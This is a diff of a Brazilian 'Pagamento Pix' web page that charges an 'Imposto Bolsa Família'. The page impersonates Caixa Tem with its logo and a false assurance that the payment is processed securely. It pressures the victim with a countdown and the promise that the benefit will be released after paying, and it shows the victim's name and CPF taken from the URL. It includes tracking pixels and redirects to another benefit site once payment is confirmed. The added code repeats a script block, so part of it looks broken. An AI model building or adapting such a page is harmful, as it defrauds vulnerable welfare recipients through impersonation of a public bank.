@@ -1,10 +1,11 @@
 <!DOCTYPE html>
+
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8">
-  <title>Pagamento Pix</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <style>
+<meta charset="utf-8"/>
+<title>Pagamento Pix</title>
+<meta content="width=device-width, initial-scale=1.0" name="viewport">
+<style>
     * { box-sizing: border-box; }
     body {
       font-family: Arial, sans-serif;
@@ -185,7 +186,6 @@
     height: auto;
   }
 </style>
-
 <script>
   let tempo = 15 * 60; // 15 minutos em segundos
 
@@ -207,7 +207,6 @@
     contador = setInterval(atualizarContador, 1000);
   });
 </script>
-
 <script>
   window.pixelId = "682037a59d79b84f10f846db";
   var a = document.createElement("script");
@@ -216,61 +215,47 @@
   a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
   document.head.appendChild(a);
 </script>
-
-<script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
-
-</head>
+<script async="" data-utmify-prevent-subids="" data-utmify-prevent-xcod-sck="" defer="" src="https://cdn.utmify.com.br/scripts/utms/latest.js"></script>
+</meta></head>
 <body>
-
 <div style="width:100%;background:#f4f4f6;padding:20px 20px 16px 20px;margin-bottom:20px;border-radius:12px;box-shadow:inset 0 -1px 0 #ccc;">
-  <div style="max-width:480px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;width:100%;">
-    <div>
-      <strong style="font-size:16px;color:#111;">Pagamento PIX</strong><br>
-      <span style="font-size:13px;color:#666;">Imposto Bolsa Família</span>
-    </div>
-    <div style="background:#e48b29;color:white;font-size:12px;padding:5px 14px;border-radius:6px;font weight 300px;;white-space:nowrap;">
+<div style="max-width:480px;margin:0 auto;display:flex;justify-content:space-between;align-items:center;width:100%;">
+<div>
+<strong style="font-size:16px;color:#111;">Pagamento PIX</strong><br/>
+<span style="font-size:13px;color:#666;">Imposto Bolsa Família</span>
+</div>
+<div style="background:#e48b29;color:white;font-size:12px;padding:5px 14px;border-radius:6px;font weight 300px;;white-space:nowrap;">
       Aguardando
     </div>
-  </div>
 </div>
-
-<div class="container">
-  <div class="produto-info">
-    <img src="logo-webp.webp" />
-    <div class="produto-dados">
-      <h3>Imposto Bolsa Familia</h3>
-      <div class="preco">R$ 51,48</div>
-      <div class="cliente">
-        Nome: <span id="nomeCliente">---</span><br>
+</div>
+<div class="container" style="display: none;">
+<div class="produto-info">
+<img src="logo-webp.webp"/>
+<div class="produto-dados">
+<h3>Imposto Bolsa Familia</h3>
+<div class="preco">R$ 51,48</div>
+<div class="cliente">
+        Nome: <span id="nomeCliente">---</span><br/>
         CPF: <span id="cpfCliente">---</span>
-      </div>
-    </div>
+</div>
+</div>
+</div>
+<div class="aguardando">
+<p><span></span> Aguardando pagamento PIX...</p>
+</div>
+<!-- AVISO IMPORTANTE -->
+<div style="background-color: #dedede87; color: #000000; padding: 14px; border-radius: 0px; font-family: Arial, sans-serif; font-size: 14px; margin-bottom: 20px; width: 100vw; margin-left: -16px; margin-right: -16px; box-sizing: border-box;">
+<strong>IMPORTANTE:</strong> Efetue o pagamento via Pix dentro do prazo estipulado para que possamos <strong>liberar seu benefício sem atrasos</strong>.
   </div>
-
-  <div class="aguardando">
-    <p><span></span> Aguardando pagamento PIX...</p>
-  </div>
-
-  <!-- AVISO IMPORTANTE -->
-  <div style="background-color: #dedede87; color: #000000; padding: 14px; border-radius: 0px; font-family: Arial, sans-serif; font-size: 14px; margin-bottom: 20px; width: 100vw; margin-left: -16px; margin-right: -16px; box-sizing: border-box;">
-    <strong>IMPORTANTE:</strong> Efetue o pagamento via Pix dentro do prazo estipulado para que possamos <strong>liberar seu benefício sem atrasos</strong>.
-  </div>
-
-  <div class="qr-area">
-    <div id="qrCode"></div>
-    <div class="contador">
-      <svg xmlns="http://www.w3.org/2000/svg" height="18" fill="#e53935" viewBox="0 0 24 24" width="18"><path d="M0 0h24v24H0V0z" fill="none"/><path d="M11 7h2v6l4.25 2.52-.75 1.23L11 14V7zm1-5C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
+<div class="qr-area">
+<div id="qrCode"></div>
+<div class="contador">
+<svg fill="#e53935" height="18" viewbox="0 0 24 24" width="18" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M11 7h2v6l4.25 2.52-.75 1.23L11 14V7zm1-5C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"></path></svg>
       PIX expira em <span id="tempoRestante">15:00</span>
-    </div>
-  </div>
-
-  <!-- Texto explicativo acima do código Pix -->
+</div>
+</div>
+<!-- Texto explicativo acima do código Pix -->
 <p style="
   font-family: Arial, sans-serif;
   font-size: 12px;
@@ -281,23 +266,20 @@
 ">
   Para efetuar o pagamento, leia o código QR ou copie o código abaixo e selecione a opção <b>"copia e cola" no aplicativo do seu banco.</b>
 </p>
-  <div class="pix-code" id="pixCode">Carregando código Pix...</div>
-  <button class="btn-copy" onclick="copiarPix()">
-    <svg xmlns="http://www.w3.org/2000/svg" height="18" viewBox="0 0 24 24" width="18" fill="#ffffff"><path d="M0 0h24v24H0V0z" fill="none"/><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
+<div class="pix-code" id="pixCode">Carregando código Pix...</div>
+<button class="btn-copy" onclick="copiarPix()">
+<svg fill="#ffffff" height="18" viewbox="0 0 24 24" width="18" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg>
     COPIAR CÓDIGO PIX
   </button>
-
-  <div class="avisos">
-    <svg xmlns="http://www.w3.org/2000/svg" height="14" fill="#666" viewBox="0 0 24 24" width="14" style="margin-right:6px;"><path d="M0 0h24v24H0z" fill="none"/><path d="M12 17a2 2 0 110-4 2 2 0 010 4zm6-6h-1V9a5 5 0 10-10 0v2H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2zM8 9a4 4 0 118 0v2H8V9z"/></svg>
+<div class="avisos">
+<svg fill="#666" height="14" style="margin-right:6px;" viewbox="0 0 24 24" width="14" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M12 17a2 2 0 110-4 2 2 0 010 4zm6-6h-1V9a5 5 0 10-10 0v2H6a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2v-8a2 2 0 00-2-2zM8 9a4 4 0 118 0v2H8V9z"></path></svg>
     Pagamento 100% seguro e processado pelo Caixa Tem.
   </div>
-
-  <div class="avisos2">
-    <svg xmlns="http://www.w3.org/2000/svg" height="14" fill="#666" viewBox="0 0 24 24" width="14" style="margin-right:6px;"><path d="M0 0h24v24H0z" fill="none"/><path d="M15.07 1H8.93C8.42 1 8 1.42 8 1.93v1.14c0 .51.42.93.93.93h6.14c.51 0 .93-.42.93-.93V1.93c0-.51-.42-.93-.93-.93zM12 4C7.58 4 4 7.58 4 12s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm.5 13h-1v-6h1v6z"/></svg>
+<div class="avisos2">
+<svg fill="#666" height="14" style="margin-right:6px;" viewbox="0 0 24 24" width="14" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"></path><path d="M15.07 1H8.93C8.42 1 8 1.42 8 1.93v1.14c0 .51.42.93.93.93h6.14c.51 0 .93-.42.93-.93V1.93c0-.51-.42-.93-.93-.93zM12 4C7.58 4 4 7.58 4 12s3.58 8 8 8 8-3.58 8-8-3.58-8-8-8zm.5 13h-1v-6h1v6z"></path></svg>
     Após o pagamento, seu benefício será aprovado em até 1 minuto, aguarde nesta página.
   </div>
 </div>
-
 <script>
   function getParam(name) {
     const url = new URL(window.location.href);
@@ -392,9 +374,138 @@ async function gerarPix() {
 }
 
 // só chama após o DOM carregar
-
+window.addEventListener('DOMContentLoaded', gerarPix);
 
   
+
+    // Verifica status do pagamento a cada 5 segundos
+    let verificador = setInterval(async () => {
+      try {
+        const urlParams = new URLSearchParams(window.location.search);
+        const id = urlParams.get("id");
+        if (!id) return;
+
+        const res = await fetch(`/pix-status?id=${id}`);
+        const data = await res.json();
+
+        if (data.status === "PAID") {
+          clearInterval(verificador);
+          
+        const baseUrl = "https://novobeneficiobolsa.com.br/inicio/bolsa-up2/";
+        const currentParams = new URLSearchParams(window.location.search);
+        const redirectParams = new URLSearchParams();
+
+        ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'xcod', 'nome'].forEach(param => {
+          if (currentParams.has(param)) {
+            redirectParams.set(param, currentParams.get(param));
+          }
+        });
+
+        const finalUrl = baseUrl + "?" + redirectParams.toString();
+        
+        const aguardandoEl = document.querySelector(".aguardando");
+        if (aguardandoEl) {
+          aguardandoEl.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" height="18" fill="#4CAF50" viewBox="0 0 24 24" width="18" style="margin-right:6px;"><path d="M0 0h24v24H0z" fill="none"/><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Pagamento confirmado!';
+        }
+        setTimeout(() => {
+          window.location.href = finalUrl;
+        }, 2000);
+
+    
+        }
+      } catch (e) {
+        console.error("Erro ao verificar status do pagamento:", e);
+      }
+    }, 5000);
+
+    // Preenche nome e CPF automaticamente se presentes na URL
+    const nomeParam = new URLSearchParams(window.location.search).get("nome");
+    const cpfParam = new URLSearchParams(window.location.search).get("cpf");
+
+    if (nomeParam) {
+      const nomeEl = document.getElementById("nomeCliente");
+      if (nomeEl) nomeEl.innerText = decodeURIComponent(nomeParam);
+    }
+
+    if (cpfParam) {
+      const cpfEl = document.getElementById("cpfCliente");
+      if (cpfEl) cpfEl.innerText = cpfParam;
+    }
+</script>
+<style>
+  .loading-overlay {
+    position: fixed;
+    inset: 0;
+    background: linear-gradient(to bottom, #0052cc, #2d87ff);
+    color: white;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+  }
+  .loading-circle {
+    width: 120px;
+    height: 120px;
+    border: 8px solid rgba(255,255,255,0.3);
+    border-top: 8px solid white;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin-bottom: 30px;
+    position: relative;
+  }
+  .loading-circle img {
+    position: absolute;
+    top: 25%;
+    left: 25%;
+    width: 50%;
+  }
+  @keyframes spin {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  .loading-text {
+    text-align: center;
+    font-family: Arial, sans-serif;
+  }
+  .loading-text h2 {
+    margin: 0;
+    font-size: 20px;
+    font-weight: bold;
+  }
+  .loading-text p {
+    margin: 8px 0 0;
+    font-size: 15px;
+  }
+</style>
+<style>
+  .logo-fixa {
+    width: 170px;
+    height: auto;
+  }
+  .logo-fixa img {
+    width: 100%;
+    height: auto;
+  }
+</style>
+<div class="loading-overlay" id="loadingScreen">
+<div class="logo-fixa" style="margin-bottom: 20px;">
+<img alt="Caixa Tem Logo" src="logocaixa-webp.webp"/>
+</div>
+<div class="loading-circle"></div>
+<div class="loading-text">
+<h2>Preparando seu pagamento</h2>
+<p>Estamos gerando seu QR Code Pix...</p>
+</div>
+</div>
+<script>
+  window.addEventListener('DOMContentLoaded', function () {
+    setTimeout(function () {
+      const overlay = document.getElementById('loadingScreen');
+      if (overlay) overlay.remove();
+      gerarPix(); // Gera o pix após 2 segundos
+    }, 4000);
+  });
 
     // Verifica status do pagamento a cada 5 segundos
     let verificador = setInterval(async () => {
@@ -450,6 +561,5 @@ async function gerarPix() {
       if (cpfEl) cpfEl.innerText = cpfParam;
     }
 </script>
-
-</body>
+<script src="loading-pix.js"></script></body>
 </html>
